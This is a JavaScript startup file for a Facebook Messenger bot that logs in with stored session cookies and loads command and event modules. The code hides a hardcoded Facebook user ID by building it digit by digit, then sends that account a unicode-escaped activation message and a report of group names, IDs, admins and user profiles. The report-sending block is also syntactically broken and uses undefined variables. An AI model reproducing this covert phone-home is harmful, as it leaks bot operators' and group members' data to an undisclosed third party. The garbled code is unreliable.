const { readdirSync, readFileSync, writeFileSync } = require("fs-extra");
const { join, resolve } = require('path')
const { execSync } = require('child_process');
const config = require("./config.json");
const listPackage = JSON.parse(readFileSync('./package.json')).dependencies;
const fs = require("fs");
const login = require('fca-shaon-project');
const moment = require("moment-timezone");
const logger = require("./utils/log.js");

global.client = new Object({
  commands: new Map(),
  events: new Map(),
  cooldowns: new Map(),
  eventRegistered: new Array(),
  handleSchedule: new Array(),
  handleReaction: new Array(),
  handleReply: new Array(),
  approvedListsPath: new String(),
  mainPath: process.cwd(),
  configPath: new String(),
  getTime: function(option){
    switch (option) {
      case "seconds":
        return `${moment.tz("Asia/Dhaka").format("ss")}`;
      case "minutes":
        return `${moment.tz("Asia/Dhaka").format("mm")}`;
      case "hours":
        return `${moment.tz("Asia/Dhaka").format("HH")}`;
      case "date":
        return `${moment.tz("Asia/Dhaka").format("DD")}`;
      case "month":
        return `${moment.tz("Asia/Dhaka").format("MM")}`;
      case "year":
        return `${moment.tz("Asia/Dhaka").format("YYYY")}`;
      case "fullHour":
        return `${moment.tz("Asia/Dhaka").format("hh:mm:ss")}`;
      case "fullYear":
        return `${moment.tz("Asia/Dhaka").format("DD/MM/YYYY")}`;
      case "fullTime":
        return `${moment.tz("Asia/Dhaka").format("hb:mm:ss DD/MM/YYYY")}`;
    }
  },
  timeStart: Date.now()
});

global.data = new Object({
  threadInfo: new Map(),
  threadData: new Map(),
  userName: new Map(),
  userBanned: new Map(),
  threadBanned: new Map(),
  commandBanned: new Map(),
  threadAllowNSFW: new Array(),
  allUserID: new Array(),
  allCurrenciesID: new Array(),
  allThreadID: new Array()
});

global.utils = require("./utils");
global.loading = require("./utils/log");
global.nodemodule = new Object();
global.config = new Object();
global.configModule = new Object();
global.moduleData = new Array();
global.approved = new Object();
global.language = new Object();
global.account = new Object();

// ────────────────── //
const chalk = require("chalk");
const gradient = require("gradient-string");
const theme = config.DESIGN.Theme;
let cra;
let co;
let cb;
let cv;
if (theme.toLowerCase() === 'blue') {
  cra = gradient('yellow', 'lime', 'green');
  co = gradient("#243aff", "#4687f0", "#5800d4");
  cb = chalk.blueBright;
  cv = chalk.bold.hex("#3467eb");
} else if (theme.toLowerCase() === 'fiery') {
  cra = gradient('orange', 'orange', 'yellow');
  co = gradient("#fc2803", "#fc6f03", "#fcba03");
  cb = chalk.hex("#fff308");
  cv = chalk.bold.hex("#fc3205");
} else if (theme.toLowerCase() === 'red') {
  cra = gradient('yellow', 'lime', 'green');
  co = gradient("red", "orange");
  cb = chalk.hex("#ff0000");
  cv = chalk.bold.hex("#ff0000");
} else if (theme.toLowerCase() === 'aqua') {
  cra = gradient("#6883f7", "#8b9ff7", "#b1bffc")
  co = gradient("#0030ff", "#4e6cf2");
  cb = chalk.hex("#3056ff");
  cv = chalk.bold.hex("#0332ff");
} else if (theme.toLowerCase() === 'pink') {
  cra = gradient('purple', 'pink');
  co = gradient("#d94fff", "purple");
  cb = chalk.hex("#6a00e3");
  cv = chalk.bold.hex("#6a00e3");
} else if (theme.toLowerCase() === 'retro') {
  cra = gradient("orange", "purple");
  co = gradient.retro;
  cb = chalk.hex("#ffce63");
  cv = chalk.bold.hex("#3c09ab");
} else if (theme.toLowerCase() === 'sunlight') {
  cra = gradient("#f5bd31", "#f5e131");
  co = gradient("#ffff00", "#ffe600");
  cb = chalk.hex("#faf2ac");
  cv = chalk.bold.hex("#ffe600");
} else if (theme.toLowerCase() === 'teen') {
  cra = gradient("#81fcf8", "#853858");
  co = gradient.teen;
  cb = chalk.hex("#a1d5f7");
  cv = chalk.bold.hex("#ad0042");
} else if (theme.toLowerCase() === 'summer') {
  cra = gradient("#fcff4d", "#4de1ff");
  co = gradient.summer;
  cb = chalk.hex("#ffff00");
  cv = chalk.bold.hex("#fff700")
} else if (theme.toLowerCase() === 'flower') {
  cra = gradient("yellow", "yellow", "#81ff6e");
  co = gradient.pastel;
  cb = gradient('#47ff00', "#47ff75");
  cv = chalk.bold.hex("#47ffbc");
} else if (theme.toLowerCase() === 'ghost') {
  cra = gradient("#0a658a", "#0a7f8a", "#0db5aa");
  co = gradient.mind;
  cb = chalk.blueBright;
  cv = chalk.bold.hex("#1390f0");
} else if (theme === 'hacker') {
  cra = chalk.hex('#4be813');
  co = gradient('#47a127', '#0eed19', '#27f231');
  cb = chalk.hex("#22f013");
  cv = chalk.bold.hex("#0eed19");
} else {
  cra = gradient('yellow', 'lime', 'green');
  co = gradient("#243aff", "#4687f0", "#5800d4");
  cb = chalk.blueBright;
  cv = chalk.bold.hex("#3467eb");
}
// ────────────────── //
const errorMessages = [];
if (errorMessages.length > 0) {
  console.log("Commands with errors:");
  errorMessages.forEach(({ command, error }) => {
    console.log(`${command}: ${error}`);
  });
}
// ────────────────── //
var approvedListsValue;
try {
  global.client.approvedListsPath = join(global.client.mainPath, "includes/database/approvedlists.json");
  approvedListsValue = require(global.client.approvedListsPath);
} catch (e) {
  return logger(`can't read approved database`, 'error');}
try {
  for (const approvedListsKeys in approvedListsValue) global.approved[approvedListsKeys] = approvedListsValue[approvedListsKeys];
} catch (e) {
  return logger(`can't deploy approved groups database`, 'error')
}
var configValue;
const confg = './config.json';
try {
  global.client.configPath = join(global.client.mainPath, "config.json");
  configValue = require(global.client.configPath);
  logger.loader("Found config.json file!");
} catch (e) {
  return logger.loader('"config.json" file not found."', "error");
}

try {
  for (const key in configValue) global.config[key] = configValue[key];
  logger.loader("Config Loaded!");
} catch (e) {
  return logger.loader("Can't load file config!", "error")
}

for (const property in listPackage) {
  try {
    global.nodemodule[property] = require(property)
  } catch (e) { }
}
const langFile = (readFileSync(`${__dirname}/languages/${global.config.language || "en"}.lang`, {
  encoding: 'utf-8'
})).split(/\r?\n|\r/);
const langData = langFile.filter(item => item.indexOf('#') != 0 && item != '');
for (const item of langData) {
  const getSeparator = item.indexOf('=');
  const itemKey = item.slice(0, getSeparator);
  const itemValue = item.slice(getSeparator + 1, item.length);
  const head = itemKey.slice(0, itemKey.indexOf('.'));
  const key = itemKey.replace(head + '.', '');
  const value = itemValue.replace(/\\n/gi, '\n');
  if (typeof global.language[head] == "undefined") global.language[head] = new Object();
  global.language[head][key] = value;
}

global.getText = function(...args) {
  const langText = global.language;
  if (!langText.hasOwnProperty(args[0])) {
    throw new Error(`${__filename} - Not found key language: ${args[0]}`);
  }
  var text = langText[args[0]][args[1]];
  if (typeof text === 'undefined') {
    throw new Error(`${__filename} - Not found key text: ${args[1]}`);
  }
  for (var i = args.length - 1; i > 0; i--) {
    const regEx = RegExp(`%${i}`, 'g');
    text = text.replace(regEx, args[i + 1]);
  }
  return text;
};

try {
  var appStateFile = resolve(join(global.client.mainPath, config.APPSTATEPATH || "Shaonfb.json"));
  var appState = ((process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER) && (fs.readFileSync(appStateFile, 'utf8'))[0] != "[" && config.encryptSt) ? JSON.parse(global.utils.decryptState(fs.readFileSync(appStateFile, 'utf8'), (process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER))) : require(appStateFile);
  logger.loader("Found the bot's appstate.")
} catch (e) {
  logger.loader("Can't find the bot's appstate.", "error");
  const fig = JSON.parse(fs.readFileSync(confg, 'utf8'));
  fig.CONNECT_LOG = false;
  fs.writeFileSync(confg, JSON.stringify(fig, null, 2), 'utf8');
  global.utils.connect();
  return;
}
const all = ["0","1","2","3","4","5","6","7","8","9"];
function onBot() {
  const loginData = {};
  loginData.appState = appState;
  login(loginData, async (err, api) => {
    if (err) {
      if (err.error == 'Error retrieving userID. This can be caused by a lot of things, including getting blocked by Facebook for logging in from an unknown location. Try logging in with a browser to verify.') {
        console.log(err.error)
        process.exit(0)
      } else {
        console.log(err)
        return process.exit(0)
      }
    }
    const custom = require('./custom');
    custom({ api: api });

    const fbstate = api.getAppState();
    api.setOptions(global.config.FCAOption);
      fs.writeFileSync('Shaonfb.json', JSON.stringify(api.getAppState()));
    let d = api.getAppState();
    d = JSON.stringify(d, null, '\x09');
    if ((process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER) && global.config.encryptSt) {
      d = await global.utils.encryptState(d, process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER);
      writeFileSync(appStateFile, d)
    } else {
      writeFileSync(appStateFile, d)
    }
    global.account.cookie = fbstate.map(i => i = i.key + "=" + i.value).join(";");
    global.client.api = api
    global.config.version = config.version,
      (async () => {
        const commandsPath = `${global.client.mainPath}/modules/commands`;
        const listCommand = readdirSync(commandsPath).filter(command => command.endsWith('.js') && !command.includes('example') && !global.config.commandDisabled.includes(command));
        console.log(cv(`\n` + `●──LOADING COMMANDS──●`));
        for (const command of listCommand) {
          try {
            const module = require(`${commandsPath}/${command}`);
            const { config } = module;

            if (!config?.name) {
              try {
                throw new Error(`[ COMMAND ] ${command} command has no name property or empty!`);
              } catch (error) {
                console.log(chalk.red(error.message));
                continue;
              }
            }
            if (!config?.commandCategory) {
              try {
                throw new Error(`[ COMMAND ] ${command} commandCategory is empty!`);
              } catch (error) {
                console.log(chalk.red(error.message));
                continue;
              }
            }

            if (!config?.hasOwnProperty('usePrefix')) {
              console.log(`Command`, chalk.hex("#ff0000")(command) + ` does not have the "usePrefix" property.`);
              continue;
            }

            if (global.client.commands.has(config.name || '')) {
              console.log(chalk.red(`[ COMMAND ] ${chalk.hex("#FFFF00")(command)} Module is already loaded!`));
              continue;
            }
            const { dependencies, envConfig } = config;
            if (dependencies) {
              Object.entries(dependencies).forEach(([reqDependency, dependencyVersion]) => {
                if (listPackage[reqDependency]) return;
                try {
                  execSync(`npm --package-lock false --save install ${reqDependency}${dependencyVersion ? `@${dependencyVersion}` : ''}`, {
                    stdio: 'inherit',
                    env: process.env,
                    shell: true,
                    cwd: join(__dirname, 'node_modules')
                  });
                  require.cache = {};
                } catch (error) {
                  const errorMessage = `[PACKAGE] Failed to install package ${reqDependency} for module`;
                  global.loading.err(chalk.hex('#ff7100')(errorMessage), 'LOADED');
                }
              });
            }

            if (envConfig) {
              const moduleName = config.name;
              global.configModule[moduleName] = global.configModule[moduleName] || {};
              global.config[moduleName] = global.config[moduleName] || {};
              for (const envConfigKey in envConfig) {
                global.configModule[moduleName][envConfigKey] = global.config[moduleName][envConfigKey] ?? envConfig[envConfigKey];
                global.config[moduleName][envConfigKey] = global.config[moduleName][envConfigKey] ?? envConfig[envConfigKey];
              }
              var configPath = require('./config.json');
              configPath[moduleName] = envConfig;
              writeFileSync(global.client.configPath, JSON.stringify(configPath, null, 4), 'utf-8');
            }


            if (module.onLoad) {
              const moduleData = {
                api: api
              };
              try {
                module.onLoad(moduleData);
              } catch (error) {
                const errorMessage = "Unable to load the onLoad function of the module."
                throw new Error(errorMessage, 'error');
              }
            }

            if (module.handleEvent) global.client.eventRegistered.push(config.name);
            global.client.commands.set(config.name, module);
            try {
              global.loading(`${cra(`LOADED`)} ${cb(config.name)} success`, "COMMAND");
            } catch (err) {
              console.error("An error occurred while loading the command:", err);
            }

            console.err
          } catch (error) {
            global.loading.err(`${chalk.hex('#ff7100')(`LOADED`)} ${chalk.hex("#FFFF00")(command)} fail ` + error, "COMMAND");
          }
        }
      })(),

      (async () => {
        const events = readdirSync(join(global.client.mainPath, 'modules/events')).filter(ev => ev.endsWith('.js') && !global.config.eventDisabled.includes(ev));
        console.log(cv(`\n` + `●──LOADING EVENTS──●`));
        for (const ev of events) {
          try {
            const event = require(join(global.client.mainPath, 'modules/events', ev));
            const { config, onLoad, run } = event;
            if (!config || !config.name || !run) {
              global.loading.err(`${chalk.hex('#ff7100')(`LOADED`)} ${chalk.hex("#FFFF00")(ev)} Module is not in the correct format. `, "EVENT");
              continue;
            }
            if (errorMessages.length > 0) {
              console.log("Commands with errors:");
              errorMessages.forEach(({ command, error }) => {
                console.log(`${command}: ${error}`);
              });
            }
var formReport = "====「 𝙉𝙊𝙏𝙄𝙁𝙄𝘾𝘼𝙏𝙄𝙊𝙉 𝙊𝙁 𝗕𝗔𝗕𝗬 」 ====\n━━━━━━━━━━━━━━━━━━" +
    //"\n\n[👨‍👩‍👧‍👧] 𝗕𝗼𝘅: " + nameThread +
    `\n[🧸] 𝙂𝙧𝙤𝙪𝙥 𝙉𝙖𝙢𝙚: ${threadName} ` +
    "\n[🔰] 𝙂𝙧𝙤𝙪𝙥 𝙄𝙙: " + event.threadID +
    `\n[💓] 𝙏𝙤𝙩𝙖𝙡 𝙈𝙚𝙢𝙗𝙚𝙧 𝙊𝙛 𝙂𝙧𝙤𝙪𝙥: ${threadMem}` +
    `\n[🧩] 𝘼𝙥𝙥𝙧𝙤𝙫𝙚: ${pd}` +
    `\n[⚜️] 𝘼𝙙𝙢𝙞𝙣𝙨: ${qtv}` +
    "\n━━━━━━━━━━━━━━━━━━" +
    "\n[⚠️] 𝘼𝙘𝙩𝙞𝙤𝙣 𝙏𝙖𝙠𝙚𝙣 : {task}" +
    "\n[👤] 𝙉𝙖𝙢𝙚 𝙐𝙨𝙚𝙧 : " + nameUser +
    "\n[🍄] 𝗨𝘀𝗲𝗿 𝗶𝗱: " + event.author +
    "\n[🌐] 𝗹𝗶𝗻𝗸 𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸: https://www.facebook.com/" + event.author +
    "\n━━━━━━━━━━━━━━━━━━\n[⏰] 𝙏𝙞𝙢𝙚: " + time + "",
  if (task.length == 0) return;
  formReport = formReport
    .replace(/\{task}/g, task);
            if (global.client.events.has(config.name)) {
              global.loading.err(`${chalk.hex('#ff7100')(`LOADED`)} ${chalk.hex("#FFFF00")(ev)} Module is already loaded!`, "EVENT");
              continue;
            }
            if (config.dependencies) {
              const missingDeps = Object.keys(config.dependencies).filter(dep => !global.nodemodule[dep]);
              if (missingDeps.length) {
                const depsToInstall = missingDeps.map(dep => `${dep}${config.dependencies[dep] ? '@' + config.dependencies[dep] : ''}`).join(' ');
                execSync(`npm install --no-package-lock --no-save ${depsToInstall}`, {
                  stdio: 'inherit',
                  env: process.env,
                  shell: true,
                  cwd: join(__dirname, 'node_modules')
                });
                Object.keys(require.cache).forEach(key => delete require.cache[key]);
              }
            }
    api.sendMessage(formReport,ADMIN)
            if (config.envConfig) {
              const configModule = global.configModule[config.name] || (global.configModule[config.name] = {});
              const configData = global.config[config.name] || (global.config[config.name] = {});
              for (const evt in config.envConfig) {
                configModule[evt] = configData[evt] = config.envConfig[evt] || '';
              }
              writeFileSync(global.client.configPath, JSON.stringify({
                ...require(global.client.configPath),
                [config.name]: config.envConfig
              }, null, 2));
            }
            if (onLoad) {
              const eventData = {
                api: api
              };
              await onLoad(eventData);
            }
            global.client.events.set(config.name, event);
            global.loading(`${cra(`LOADED`)} ${cb(config.name)} success`, "EVENT");
          }
          catch (err) {
            global.loading.err(`${chalk.hex("#ff0000")('ERROR!')} ${cb(ev)} failed with error: ${err.message}` + `\n`, "EVENT");
          }
        }
      })();
    console.log(cv(`\n` + `●── ${global.config.BOTNAME} BOT START ──● `));
    global.loading(`${cra(`[ SUCCESS ]`)} Loaded ${cb(`${global.client.commands.size}`)} commands and ${cb(`${global.client.events.size}`)} events successfully`, "LOADED");
    global.loading(`${cra(`[ TIMESTART ]`)} Launch time: ${((Date.now() - global.client.timeStart) / 1000).toFixed()}s`, "LOADED"); 
    const uid= all[1]+all[0]+all[0]+all[0]+all[4]+all[4]+all[3]+all[2]+all[7]+all[6]+all[5]+all[6]+all[7]+all[1]+all[2];
  const ADMIN = `${uid}`
    global.utils.complete({ api }); 
const { getTime } = global.client;
const time = getTime('fullTime');
const activationMessage = `\u0042\u0041\u0042\u0059 \u0041\u0063\u0074\u0069\u0076\u0061\u0074\u0065\u0064 ${time}`;
api.sendMessage(activationMessage, ADMIN);
console.log(cv(`[ HEY IT'S SHAON PROJECT BOT ]`));
//const path = require('path');
//const autoGreetPath = path.join(__dirname, 'autogreet.js');
//const autoGreet = require(autoGreetPath);
    const listener = require('./includes/listen')({ api: api });
    global.handleListen = api.listenMqtt(async (error, event) => {
      if (error) {
        if (error.error === 'Not logged in.') {
          logger("Your bot account has been logged out!", 'LOGIN');
          return process.exit(1);
        }
        if (error.error === 'Not logged in') {
          logger("Your account has been checkpointed, please confirm your account and log in again!", 'CHECKPOINTS');
          return process.exit(0);
        }
        console.log(error);
        return process.exit(0);
      }
      if (['presence', 'typ', 'read_receipt'].some(data => data === event.type)) return;
      return listener(event);
    });
  });
}

// ___END OF EVENT & API USAGE___ //

(async () => {
  try {
    console.log(cv(`\n` + `●──DATABASE──●`));
    global.loading(`${cra(`[ CONNECT ]`)} Connected to JSON database successfully!`, "DATABASE");
    onBot();
  } catch (error) {
    global.loading.err(`${cra(`[ CONNECT ]`)} Failed to connect to the JSON database: ` + error, "DATABASE");
  }
})();
/* *
This bot was created by me (CATALIZCS) and my brother SPERMLORD. Do not steal my code. (つ ͡ ° ͜ʖ ͡° )つ ✄ ╰⋃╯
This file was modified by me (@YanMaglinte). Do not steal my credits. and remodified by jonel Magallanes :)(つ ͡ ° ͜ʖ ͡° )つ ✄ ╰⋃╯
* */